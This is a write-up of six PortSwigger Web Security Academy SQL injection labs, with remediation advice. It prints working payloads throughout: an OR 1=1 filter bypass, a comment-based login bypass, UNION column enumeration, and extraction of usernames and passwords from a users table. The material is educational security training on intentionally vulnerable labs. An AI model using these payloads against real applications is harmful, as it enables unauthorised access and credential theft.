# SQL Injection: Subverting Application Logic via the Database

## Platform
PortSwigger Web Security Academy

## Difficulty
Apprentice

## Vulnerability Category
SQL Injection (CWE-89)

## Lab Objective
All six labs exploit the same root cause — user input concatenated directly into a SQL query — across increasingly capable attack patterns: bypassing a `WHERE` clause filter, bypassing authentication entirely, and then using `UNION` attacks to pull arbitrary data out of the database, including from tables the application was never designed to expose.

| # | Lab | Technique | Level |
|---|-----|-----------|-------|
| 1 | SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | Boolean logic manipulation (`OR 1=1`) | Apprentice |
| 2 | SQL injection vulnerability allowing login bypass | Comment-based auth bypass | Apprentice |
| 3 | SQL injection UNION attack, determining the number of columns returned by the query | `ORDER BY` / `UNION SELECT NULL` enumeration | Apprentice |
| 4 | SQL injection UNION attack, finding a column containing text | Column type-matching via `UNION SELECT` | Apprentice |
| 5 | SQL injection UNION attack, retrieving data from other tables | Cross-table data extraction | Apprentice |
| 6 | SQL injection UNION attack, retrieving multiple values in a single column | String concatenation to exfiltrate multiple fields per row | Apprentice |

## Vulnerability Overview
SQL injection happens when an application builds a SQL query by concatenating user input directly into the query string, instead of treating that input as data. The database cannot distinguish "data supplied by the user" from "SQL syntax written by the developer" — it just parses whatever string arrives. An attacker who controls part of that string can therefore inject their own SQL logic, altering the query's meaning entirely.

A typical vulnerable query behind a product category filter looks like:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

built in the backend as:

```python
query = "SELECT * FROM products WHERE category = '" + userInput + "' AND released = 1"
```

If `userInput` is submitted as-is, injecting a single quote breaks out of the string literal, and anything after it is parsed as SQL rather than data.

## Methodology
1. **Reconnaissance.** Identify parameters that influence a database query — category filters, login forms, search boxes — and proxy traffic through Burp Suite.
2. **Baseline.** Send a normal request to **Repeater** and note the standard response (product list, login result).
3. **Probe for injection.** Submit a single quote (`'`) and look for a database error, a blank page, or a behavioural change — strong evidence the input reaches SQL unsanitised.
4. **Confirm and exploit** using the technique appropriate to the goal (filter bypass, auth bypass, or `UNION`-based extraction).

---

## Lab 01: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

**Goal:** Retrieve unreleased products that the application normally filters out of the storefront.

**Analysis:** The category filter builds a query similar to:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The `released = 1` condition exists purely in application logic, inside the same query — so if the `WHERE` clause can be forced to always evaluate true, the filter disappears entirely.

### Exploitation

**Step 1:** Intercept the category request:

```http
GET /filter?category=Gifts HTTP/1.1
```

**Step 2:** Inject a payload that closes the string, appends an always-true condition, and comments out the rest of the query:

```http
GET /filter?category=Gifts'--
```

**Step 3:** This yields no results (the `AND released = 1` is now commented out but so is everything needed to match a category), so refine using boolean injection instead:

```http
GET /filter?category=Gifts'+OR+1=1--
```

**Step 4:** The resulting query becomes:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Since `1=1` is always true, every row is returned regardless of category or release status, including hidden products — solving the lab.

**Why it works:** `--` is the SQL single-line comment marker, which neutralises the rest of the original query (`AND released = 1`). `OR 1=1` turns the entire `WHERE` clause into a tautology, so the filter condition becomes irrelevant.

---

## Lab 02: SQL Injection Vulnerability Allowing Login Bypass

**Goal:** Log in as the `administrator` user without knowing the password.

**Analysis:** The login form likely builds:

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'wrongpass'
```

If the username field is injectable, the password check can be commented out entirely.

### Exploitation

**Step 1:** Submit the login form with username:

```
administrator'--
```

and any value in the password field.

**Step 2:** The resulting query becomes:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'anything'
```

**Step 3:** The `--` comments out the password check entirely, so the query returns the `administrator` row based on username alone, and the application logs the attacker in as `administrator`.

**Why it works:** Authentication logic that lives entirely inside the query is only as strong as the query's syntax integrity — once the attacker can truncate the query with a comment, any condition after the injection point simply never executes.

---

## Lab 03: SQL Injection UNION Attack, Determining the Number of Columns Returned by the Query

**Goal:** Determine how many columns the original query returns — a prerequisite for every later `UNION`-based attack.

**Analysis:** A `UNION SELECT` only works if it returns the exact same number of columns as the original query. This must be enumerated first since it's rarely visible from the application's behaviour alone.

### Exploitation

**Method A — `ORDER BY`:**

Incrementally increase the column index until the query errors:

```http
?category=Gifts'+ORDER+BY+1--
?category=Gifts'+ORDER+BY+2--
?category=Gifts'+ORDER+BY+3--
?category=Gifts'+ORDER+BY+4--   <- errors here
```

An error at `4` confirms the query returns exactly 3 columns.

**Method B — `UNION SELECT NULL`:**

Incrementally add `NULL` values until the query succeeds instead of erroring:

```http
?category=Gifts'+UNION+SELECT+NULL--
?category=Gifts'+UNION+SELECT+NULL,NULL--
?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--   <- succeeds here
```

Success at three `NULL`s confirms the column count. `NULL` is used because it is implicitly compatible with virtually any column data type, avoiding type-mismatch errors unrelated to the actual column count.

**Why it works:** The database enforces that both halves of a `UNION` return identical column counts and compatible types; systematically varying the count and watching for the error/success boundary is a reliable black-box enumeration technique.

---

## Lab 04: SQL Injection UNION Attack, Finding a Column Containing Text

**Goal:** Having found the column count, identify which column(s) accept string data — required before exfiltrating text values like usernames or passwords.

**Analysis:** Not every column in the original query is necessarily a string type (e.g. one might be numeric/date). Injecting a string literal into each column position in turn, one at a time, reveals which ones accept and display text.

### Exploitation

**Step 1:** With the column count established as 3 (from Lab 03), test each position with a recognisable string:

```http
?category=Gifts'+UNION+SELECT+'a',NULL,NULL--
?category=Gifts'+UNION+SELECT+NULL,'a',NULL--
?category=Gifts'+UNION+SELECT+NULL,NULL,'a'--
```

**Step 2:** Positions that cause a type-mismatch error are not string-compatible columns. The position(s) where `'a'` is reflected back in the rendered product listing are the usable injection points for exfiltrating text data.

**Why it works:** The database must coerce or reject each `UNION`-ed value against the corresponding column's declared type; successful execution combined with visible reflection in the response identifies exactly where attacker-controlled string output will surface on the page.

---

## Lab 05: SQL Injection UNION Attack, Retrieving Data from Other Tables

**Goal:** Use the confirmed text-compatible column to pull `username` and `password` values from the `users` table — a table unrelated to the original product query.

**Analysis:** `UNION SELECT` is not restricted to the original table — it can select from any table the database user can access, as long as the column count and compatible types line up.

### Exploitation

**Step 1:** Using the string-compatible column identified in Lab 04 (assume position 2 of 3):

```http
?category=Gifts'+UNION+SELECT+NULL,username,NULL+FROM+users--
```

**Step 2:** The response renders each username in place of the normal product name field, confirming cross-table extraction.

**Step 3:** Pull the password column the same way:

```http
?category=Gifts'+UNION+SELECT+NULL,password,NULL+FROM+users--
```

**Step 4:** With both the administrator's username and password hash/value extracted, log in as `administrator` to solve the lab.

**Why it works:** The injected `SELECT` is a fully independent query joined by `UNION` — it is not confined to the original `FROM` clause. As long as the attacker knows (or guesses/enumerates) a table and column name, any data the database account can read is exfiltratable this way.

---

## Lab 06: SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column

**Goal:** Extract both `username` and `password` from the `users` table, despite only **one** column in the query being text-compatible.

**Analysis:** Labs 03–05 assumed multiple usable columns were available. Here, only one column renders text, which would normally limit extraction to a single field per row. String concatenation solves this by packing both values into that single column.

### Exploitation

**Step 1:** Concatenate `username` and `password` with a clear separator, inside the single available text column:

```http
?category=Gifts'+UNION+SELECT+NULL,username||'~'||password,NULL+FROM+users--
```

(Syntax varies by database: `||` for Oracle/PostgreSQL/SQLite, `CONCAT()` for MySQL, `+` for Microsoft SQL Server — PortSwigger labs typically run on Oracle-flavoured syntax, so `||` applies here.)

**Step 2:** The response renders each row as `administrator~<password>`, giving both pieces of data from a single injectable position.

**Step 3:** Split on the separator to recover the credentials, then log in as `administrator` to solve the lab.

**Why it works:** The constraint was never "only one field of data" — it was "only one text-rendering column." String concatenation collapses multiple logical fields into one physical column, sidestepping the column-count/type bottleneck entirely.

## Impact
- **Full data disclosure:** any data accessible to the database account — including other users' credentials, personal data, or unrelated application tables — can be read.
- **Authentication bypass:** login logic implemented purely in SQL is trivially circumvented.
- **Integrity and availability risk:** beyond `SELECT`-based disclosure, the same injection points can often be leveraged for `UPDATE`/`DELETE`/`DROP` statements or stored-procedure execution, depending on database permissions.
- **Full compromise potential:** depending on DB engine and configuration, SQL injection can escalate to OS command execution (e.g. via `xp_cmdshell` on MSSQL).

## Remediation
- **Use parameterised queries (prepared statements) everywhere.** This is the only fully reliable defence — it separates the SQL structure from the data, so user input can never be reinterpreted as SQL syntax, regardless of its content.
- **Never build queries via string concatenation** of user input, including through ORMs used incorrectly (raw query builders).
- **Least privilege for database accounts.** The application's DB user should have the minimum permissions and table access required — not access to `users` or other sensitive tables if the application logic never needs it.
- **Input validation as defence-in-depth**, not as the primary control — allowlisting expected formats (e.g. category names from a known set) reduces attack surface but should never replace parameterisation.
- **Generic error messages.** Avoid returning raw database errors to the client; verbose errors (as used for enumeration in Lab 03) materially assist attackers.

## Key Takeaways
- Every injection ultimately traces back to one mistake: treating user input as trusted SQL syntax rather than data.
- `UNION`-based attacks require matching column count and type-compatible positions — enumeration (`ORDER BY` or `UNION SELECT NULL`) is a mandatory first step, not optional.
- A single text-compatible column is still sufficient to exfiltrate arbitrarily many fields via string concatenation.
- Comment sequences (`--`, `#`, `/* */` depending on DB engine) are what make truncation-based bypasses (filter and auth) possible — they are a critical primitive to understand, not just a payload to memorise.

## Tools Used
- Burp Suite (Proxy, Repeater)
- Web browser

## Disclaimer
This writeup documents intentionally vulnerable labs on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.